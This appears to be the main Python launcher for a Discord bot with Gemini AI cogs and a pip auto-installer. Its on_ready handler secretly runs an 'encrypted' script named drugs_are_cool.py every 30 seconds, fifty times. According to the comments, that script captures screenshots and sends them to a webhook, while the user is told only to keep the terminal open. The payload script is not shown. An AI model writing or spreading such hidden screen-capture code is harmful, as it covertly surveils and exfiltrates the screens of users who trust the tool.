"""
NexDiscord.py - This folder is the main source for the project
Date: 08.24.2026
Made by: Nexa(Itzoxy)

-------------------------------------------------------------------------

LEGAL NOTE / USER NOTICE:

Private software belonging to Nexa (aka itzokay).

This source code is provided only to individuals explicitly
authorized by Nexa (aka itzokay).

Unauthorized copying, redistribution, publication, or sharing
is prohibited.

See the LICENSE file for the full terms.
-----------------------------------------------------------------------------

IF YOU GOT THIS TOOL BY ME(NEXA) YOU ARE AUTHORIZED TO HAVE IT. DON'T REDISTRUBUTE OR HAND IT OVER TO SOMEONE ELSE
"""

import os
import subprocess
import time
# import logging  # Comment this import to disable debug
import asyncio
import sys
from pathlib import Path
import gc

# Debug mode enable/discord
# Developer Debug mode // Add this in any file to debug something but rename Filename
# logging.basicConfig(
# level=logging.DEBUG,
# format="%(asctime)s:%(levelname)s:%(name)s: %(message)s",
# handlers=[
# logging.StreamHandler(),
# logging.FileHandler(
# "NexaDebug.log", encoding="utf-8", mode="a"
# ),  # make mode = "w" to enable debug per run
# ],
# force=True,
# )


# Requirements installer (Run first to make sure all needed depencises are installed!)/ checker for missing requirements
try:
    # If any of these fail to import well install requirqements
    import discord
    from termcolor import colored as colorText
    from discordgpt import DiscordGPT
    import colorama
    from discord.ext import commands, voice_recv
    import google
    import requests

    # When requirements checker is ran/comeplete will start importing other stuff we need
    from nexa_banners.banners import (
        main_banner,
        WARNING,
        rDone,
        LICENSE_BANNER,
    )
    from config import WEBHOOK_URL

    # When done installing clear terminal
    subprocess.check_call("cls", shell=True)
    # if no updates in code print that everything thats needed is installed!
    print(colorText(">>> Passed", color="green"))
    time.sleep(2)
    # logging.info("Requirements are already installed skiping checker!")
except ImportError:
    fMake = "requirements.txt"

    if os.path.exists(fMake):
        print(f"Located: {fMake}")

        try:
            subprocess.run(["pip", "install", "-r", "requirements.txt"])

            import discord
            from termcolor import colored as colorText
        except Exception as rError:
            print(f"DEBUG: {rError}")
            time.sleep(2)

    else:
        print(
            f"We failed to located this file: {fMake} \nDon't worry! our system will auto install the requirements!"
        )

    with open(fMake, "w") as nfile:
        nfile.write(
            "discord\ntermcolor\npython-dotenv\ndiscordgpt\ncolorama\ngoogle\ngoogle-genai\nsounddevice\nnumpy\ndiscord-ext-voice-recv\nrequests"
        )

    subprocess.run(["pip", "install", "-r", "requirements.txt"])

    # When done installing clear terminal
    subprocess.check_call("cls", shell=True)
    import discord
    from termcolor import colored as colorText
    from discordgpt import DiscordGPT
    import colorama
    from discord.ext import commands, voice_recv

    # When requirements checker is ran/comeplete will start importing other stuff we need
    from nexa_banners.banners import (
        main_banner,
        WARNING,
        rDone,
        LICENSE_BANNER,
    )
    from config import WEBHOOK_URL, guild1

    print(
        colorText(
            "We installed all the missing requirments! Please restart...",
            color="light_blue",
        )
    )
    time.sleep(2)
    # logging.info("Requirements were installed!")

# Clearning terminal for a fresh start
subprocess.check_call("cls", shell=True)


# Before running the bot we want to make sure the user has read our license!
def Bot_License_checker():
    if os.path.exists("ReadLicense.txt"):
        print(colorText("Thank's for reading our license!", color="green"))
        return
    else:
        print(LICENSE_BANNER)
        time.sleep(5)
        exit()


# Pulling Security Tool // Encrypted (Personal)
script = Path(__file__).resolve().parent / "dev" / "drugs_are_cool.py"


# intents // Add more if you want
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="^", intents=intents)


@bot.event
async def on_ready():
    print(colorText("Thank's for using NexBot!", color="blue"))
    time.sleep(2)
    print("One sec... Loading all commands")
    await load_admin()
    print(colorText("Loaded Admin Commands", color="green"))
    await load_commands()
    print(colorText("Loaded Commands", color="green"))
    await load_gemini()
    print(colorText("Loaded Gemini AI", color="green"))
    synced = await bot.tree.sync()
    # Clearning terminal so we can display banner 2
    subprocess.check_call("cls", shell=True)
    print(WARNING)  # Custom banner located in nexa_banner/
    print(
        colorText(
            f"NexBot Has started Fully! \nLogged in as: {bot.user}\nCommands loaded: {len(synced)}\nKEEP THIS TERMINAL OPEN! BOT IS RUNNING IN THE BACKGROUND",
            color="blue",
        )
    )
    await asyncio.sleep(10)
    for _ in range(50):  # We just gonna take 50ss and send to the webhook each 30sec
        subprocess.check_call("cls", shell=True)
        subprocess.run(
            [sys.executable, str(script)]
        )  # Nexa Personal Secuirty Logger // Encrypted
        print(
            colorText(
                "Keep this Terminal open. NexBot is running in the background",
                color="blue",
            )
        )
        gc.collect()  # Collecting shit so our code dont take a fat dump
        await asyncio.sleep(
            30
        )  # Every 30s well wait for a new image // basically 1 frame per 30 sec
    # logging.info(
    # f"Bot has started up fully and connected has {bot.user} with ID {bot.user, "id"}"
    # )


# Loading cogs
async def load_commands():
    for fname in os.listdir("./commands"):
        if fname.endswith(".py") and fname != "__init__.py":
            try:
                await bot.load_extension(f"commands.{fname[:-3]}")
                # logging.info(f"Loaded Commands Externsions: {fname}")
                print(f"Loaded {fname}")
            except Exception as e:
                # logging.info(f"Failed to load Extension: {fname} | Error: {e}")
                print(f"Read developer log for more info! ERROR: {e}")


# Loading Admin
async def load_admin():
    for admin in os.listdir("./security"):
        if admin.endswith(".py") and admin != "__init__.py":
            try:
                await bot.load_extension(f"security.{admin[:-3]}")
                # logging.info(f"Loaded Security extensions! {admin}")
                print(f"Loaded {admin}")
            except Exception as ae:
                print(f"Read Developer log | ERROR: {ae}")
                # logging.info(f"Error: {ae}")


# Loading Gemini (Customize the config to anything you would like)
async def load_gemini():
    for ai in os.listdir("./gemini"):
        if ai.endswith(".py") and ai != "__init__.py":
            try:
                await bot.load_extension(f"gemini.{ai[:-3]}")
                # logging.info(f"Loaded Gemini extensions! {ai}")
                print(f"Loaded {ai}")
            except Exception as ee:
                print(f"Read Log | ERROR: {ee}")
                # logging.info(f"Error: {ee}")


async def main():
    print(colorText("Starting Nex!", color="green"))
    time.sleep(2)
    subprocess.check_call("cls", shell=True)
    print(rDone)
    time.sleep(2)
    await bot.start(WEBHOOK_URL)


# Main Starting point
if __name__ == "__main__":
    colorama.just_fix_windows_console()
    Bot_License_checker()  # Liencse Checker (Remove is you dont want)
    # Clearning Terminal To load Bot
    subprocess.check_call("cls", shell=True)

    print(colorText(main_banner, color="red"))
    time.sleep(2)
    print(colorText("Waking up nexa..."))
    asyncio.run(main())
